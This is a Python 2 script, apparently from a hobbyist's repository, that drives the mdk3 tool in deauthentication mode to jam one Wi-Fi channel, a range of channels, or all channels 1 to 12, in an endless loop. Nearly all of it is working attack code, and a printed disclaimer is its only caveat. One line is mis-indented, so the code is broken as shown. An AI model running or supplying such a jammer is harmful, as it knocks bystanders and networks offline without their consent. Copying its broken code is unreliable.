import time
import subprocess
import os

# Clear screen and wait briefly
time.sleep(1)
os.system("clear")

# Print banner
print "-" * 60
print "          [ - MDK3 Channel Jammer - ]"
print "! Code was created by Fattcat for Tp_Link Archer C7 v5 personal usage !"
print "Checkout my GitHub Repo --> github.com/Fattcat"
print "Checkout my YouTube --> https://www.youtube.com/channel/UCKfToKJFq-uvI8svPX0WzYQ"
print "! DONT USE THIS CODE FOR BAD HACKING or WITHOUT PERMISSIONS !"
print "-" * 60 + "\n"

print "Checking if script was started with sudo ..."

def check_sudo():
    if os.geteuid() != 0:
        print "Script was NOT started with sudo. Please start the script with sudo."
        exit()
    else:
        print "Script was started with sudo :D\nContinuing"

def get_valid_channel(prompt):
    while True:
        try:
            channel = int(raw_input(prompt))
            if 1 <= channel <= 12:
                return channel
            else:
                print "Invalid channel! Please enter a channel number between 1 and 12."
        except ValueError:
            print "Invalid input! Please enter a valid integer."

def get_current_channel():
    result = subprocess.check_output(["iw", "dev", adapter, "info"])
    for line in result.splitlines():
        if "channel" in line:
            return int(line.split()[1])
    return None

def set_channel(channel):
    current_channel = get_current_channel()
    if current_channel != channel:
subprocess.call(["iw", "dev", adapter, "set", "channel", str(channel)])
        time.sleep(2)

def jam_specific_channel():
    channel = get_valid_channel("Type channel number (1-12) --> ")
    while True:
        set_channel(channel)
        process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
        time.sleep(10)
        process.terminate()
        time.sleep(3)

def jam_channel_range(first_channel, second_channel):
    while True:
        if first_channel <= second_channel:
            for channel in range(first_channel, second_channel + 1):
                set_channel(channel)
                process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
                time.sleep(10)
                process.terminate()
                time.sleep(3)
        else:
            print "Second channel MUST BE GREATER than FIRST channel !"
            exit()

def jam_all_channels():
    while True:
        for channel in range(1, 13):
            set_channel(channel)
            process = subprocess.Popen(["mdk3", adapter, "d", "-c", str(channel)])
            time.sleep(10)
            process.terminate()
            time.sleep(3)

# Check if the script was started with sudo
check_sudo()

adapter = "wlan1mon"

print "\nLoading MDK3 CHANNEL JAMMER...\n"
time.sleep(1)

print "Please select an option\n"
print "[1] - Jam ONLY 1 specific channel"
print "[2] - Jam ALL channels (Pick CH to Pick CH)"
print "      Example : First CH 6, Second CH 9"
print "[3] - Jam ALL channels (1 to 12)\n"


# User input for selection
pick_to_jam = raw_input("I will Pick --> ")

if pick_to_jam == "1":
    jam_specific_channel()

elif pick_to_jam == "2":
    first_channel = get_valid_channel("Type FIRST channel number (1-12) --> ")
    second_channel = get_valid_channel("Type SECOND channel number (1-12) --> ")

    if first_channel > second_channel:
        print "! WARNING !\nSecond Channel MUST BE GREATER than First Channel!"
        print "For example:\nFirst Channel: 9\nSecond Channel: 3"
    else:
        jam_channel_range(first_channel, second_channel)

elif pick_to_jam == "3":
    jam_all_channels()
else:
    print "Selected WRONG Option:", pick_to_jam
    exit()